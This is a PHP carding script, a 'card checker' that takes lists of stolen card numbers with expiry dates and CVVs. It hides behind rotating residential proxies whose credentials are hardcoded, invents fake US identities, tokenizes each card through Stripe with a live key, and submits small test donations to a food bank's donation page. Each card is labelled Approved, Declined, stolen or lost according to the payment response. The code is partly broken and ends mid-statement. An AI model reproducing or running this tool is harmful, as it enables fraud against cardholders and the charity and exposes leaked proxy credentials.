<?php

////////////////////////////===[https://app.cheerfulgiving.com/p/southeastern-food-bank]

require 'function.php';

extract($_GET);
error_reporting(0);
DeletarCookies();
$randCookie = rand(100000000,999999999);
$loadtime = time();


function deletarCookies() {
    if (file_exists("functioncookie.txt")) {
        unlink("functioncookie.txt");
    }
    
}
function GetStr($string,$start,$end){
        $str = explode($start,$string);
        $str = explode($end,$str[1]);
        return $str[0];
    }
    $lista   = $_GET['lista']; 
    $explode = explode('|',$lista); 
    $cc      = $explode[0]; 
    $mm      = $explode[1];
    $yy      = $explode[2];
    $cvv     = $explode[3];
    $cc_plus = "";
    $atual = 0;
    while ($atual < strlen($ccn)) {
        $cc_plus .= $ccn[$atual];
        if (($atual + 1) > 0 && ($atual + 1) % 4 == 0 && $atual < 15) {
            $cc_plus .= "+";
        }
        $atual++;
    }
    $cca1    = substr($cca,-2,2);
    if(strlen($ccm<='09')){
        $ccm1=substr($ccm,1,2);
    } else {
        $ccm1=$ccm;
    }
    $bin1 = substr($ccn, 0, 6); 
    $file = 'bins.csv'; 
    $searchfor = $bin1; 
    $contents = file_get_contents($file); 
    $pattern = preg_quote($searchfor, '/'); 
    $pattern = "/^.*$pattern.*\$/m"; 
    if (preg_match_all($pattern, $contents, $matches)) { 
        $encontrada = implode("\n", $matches[0]); 
    } 
    $pieces = explode(";", $encontrada); 
    $c = count($pieces); 
    if ($c == 8) { 
        $pais = $pieces[4]; 
        $paiscode = $pieces[5]; 
        $banco = $pieces[2]; 
        $level = $pieces[3]; 
        $bandeira = $pieces[1]; 
    } else { 
        $pais = $pieces[5]; 
        $paiscode = $pieces[6]; 
        $level = $pieces[4]; 
        $banco = $pieces[2]; 
        $bandeira = $pieces[1]; 
    }


$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
function monarchproxys(){ 
  $poxySocks = file("Socks5.txt"); 
   $myproxy = rand(0, sizeof($poxySocks)-1); 
   $poxySocks = $poxySocks[$myproxy]; 
    return $poxySocks; 
 } 
 $poxySocks4 = monarchproxys();

 ////////////////////////////===[Randomizing Details Api]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, 'postcode":', ',');
$state = value($resposta, 'state":"', '"');
$email = value($resposta, 'email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, 'street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com","t-online.de","orange.fr");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/

////////////////////////////===[Luminati Details]

$url = $_POST['1'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
// Proxy Details Luminaty Proxy
$username = 'lum-customer-hl_499dc6e5-zone-reboot';
$password = 'cdn3xkn4vz24';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'GET');
curl_setopt ($ch, CURLOPT_HEADER, 1);
curl_exec ($ch); 
$curl_scraped_page = curl_exec($ch);
curl_close($ch);

echo $curl_scraped_page;

/////////////==========For Randomizing UserAgent

$user_agent = random_ua();

/////////////==========For Randomizing UserAgent

$amount = '$1.'.rand(50,99);
#=============================================================================================================================================================

$ch = curl_init();
//////////======= LUMINATI
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json', 
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://js.stripe.com',
'referer: https://js.stripe.com/v3/controller-ca29fa4b08854a508376c726b7f94108.html',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-site'));
//'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

///////////////////////=============Sort Codes

// | '.$cc.' | '.$mm.' | '.$yy.' | '.$cvv.' | '.$firstname.' | '.$email.'

// | '.$lastname.' | '.$Street.' | '.$city.' | '.$State.' | '.$Zip.'

///////////////////////=============

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$firstname.'+'.$lastname.'&card[address_zip]='.$Zip.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=bc167e50-2360-46ed-beca-da04201f1ac4&sid=0769e188-c3ce-4a40-9fca-37d2bc8acad1&payment_user_agent=stripe.js%2Fc073fbdd%3B+stripe-js-v3%2Fc073fbdd&referrer=https%3A%2F%2Fjs.stripe.com%2F&key=pk_live_Cv9hdAGN9iwvdHeFGXpqIaRk00qNWP1K7Y');

$result = curl_exec($ch);

$token = trim(strip_tags(getStr($result,'"id": "','"')));

//////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

$ch = curl_init();
/////////========Luminati
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.cheerfulgiving.com/');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

/////////////////////=============Sort Codes

// | '.$cc.' | '.$mm.' | '.$yy.' | '.$cvv.' | '.$firstname.' | '.$email.'

// | '.$lastname.' | '.$Street.' | '.$city.' | '.$State.' | '.$Zip.'

/////////////////////=============

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  // 'Host: '#',    [If No Host Data On Site Dont Uncomment It]  
  'accept: */*',
  'content-type: application/json',
  // 'cookie: #',   [If No Cookie Data On Site Dont Uncomment It]
  'origin: https://app.cheerfulgiving.com',
  'referer: https://app.cheerfulgiving.com/p/southeastern-food-bank',
  'sec-fetch-mode: cors',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"CreateDonationTransaction","variables":{"userId":"5e2d2cb1b9082d00076a2645","amount":1.5,"coverFees":true,"paymentToken":{"id":"'.$token.'","type":"card"},"frequency":"one-time","organizationId":"5b1ed494362b467f32a34be9","campaignId":"","eventId":"","guest":true,"source":{"id":"5da9d6cedbab6b0007411410","type":"page"},"additionalFields":{"additionalFields":[]},"ecard":null},"query":"mutation CreateDonationTransaction($amount: Float!, $frequency: String, $organizationId: ID!, $campaignId: String, $eventId: ID, $coverFees: Boolean, $userId: ID, $guest: Boolean, $paymentToken: JSON, $source: JSON, $additionalFields: JSON, $ecard: JSON) {\n  transactionCreate(amount: $amount, frequency: $frequency, organizationId: $organizationId, campaignId: $campaignId, coverFees: $coverFees, userId: $userId, guest: $guest, paymentToken: $paymentToken, eventId: $eventId, source: $source, additionalFields: $additionalFields, ecard: $ecard) {\n    id\n    amount\n    status\n    type\n    __typename\n  }\n}\n"}]');

$result = curl_exec($ch);
$status = trim(strip_tags(getStr($result, '"status":"','"'))); 
$message = trim(strip_tags(getStr($result,'"message":"','"'))); 

/////////////////////////// Bin Lookup Api //////////////////////////

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
	$type = 'Credit';
} else {
	$type = 'Debit';
}

/////////////////////////// [Card Response]  //////////////////////////


if(strpos($result, "'/donations/thank_you?donation_number=","'" )) {
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Successfully Charged - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Successfully Charged - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Successfully Charged - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Successfully Charged - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Successfully Charged - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV - Incorrect Zip)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV - Incorrect Zip)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "Success" )) {
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Successfully Charged - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "succeeded." )) {
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Successfully Charged - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-light">「Approved」</span> ◈ </span> </span> <span class="badge badge-light">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Fraudulent Card」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-success">「Approved」</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (͏CVV)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「'.$status.' Charging - 1.5$」</span> </br>';
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-light">「Approved」</span> ◈ </span> </span> <span class="badge badge-light">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Insufficient Funds」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-light">「Approved」</span> ◈ </span> </span> <span class="badge badge-light">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Insufficient Funds」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-light">「Approved」</span> ◈ </span> </span> <span class="badge badge-light">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Lost Card」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-light">「Approved」</span> ◈ </span> </span> <span class="badge badge-light">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Stolen Card」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
    echo '<span class="badge badge-light">「Approved」</span> ◈ </span> </span> <span class="badge badge-light">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (CCN)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-light">「Approved」</span> ◈ </span> </span> <span class="badge badge-light">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Approved (CCN)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-light">「Approved」</span> ◈ </span> </span> <span class="badge badge-light">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Pickup Card (Reported Stolen Or Lost)」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, 'Your card has expired.' )) {
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Expired Card」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Expired Card」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Incorrect Card Number」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Incorrect Card Number」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "service_not_allowed")) {
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Service Not Allowed」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "do_not_honor")) {
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Declined : Do_Not_Honor」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Declined : Generic_Decline」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Card Declined」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Declined : Generic_Decline」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「CVC_Check : Unavailable」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「CVC_Unchecked : Proxy Error」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「CVC_Unchecked : Fail」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Declined : Missing Card Details」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,"lock_timeout")){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Another Request In Process : Card Not Checked」</span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
   echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Card Doesnt Support Purchase」 </span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,"transaction_not_allowed")){
   echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Card Doesnt Support Purchase」 </span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,"three_d_secure_redirect")){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Card Doesnt Support Purchase」 </span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
   echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「3D Secure Redirect」 </span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
    '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Missing Payment primaryrmations」 </span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
    '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Missing Credit Card Number」 </span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
}
elseif(strpos($result, "card_not_supported")) {
    '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Card Not Supported」 </span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
}
elseif(strpos($result, 'Your card is not supported.')) {
    '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-primary"> 「Card Not Supported」 </span> ◈</span> <span class="badge badge-primary"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> ◈</span> <span class="badge badge-primary"> 「Tried Charging - '.$amount.'」</span> </br>';
}
else {
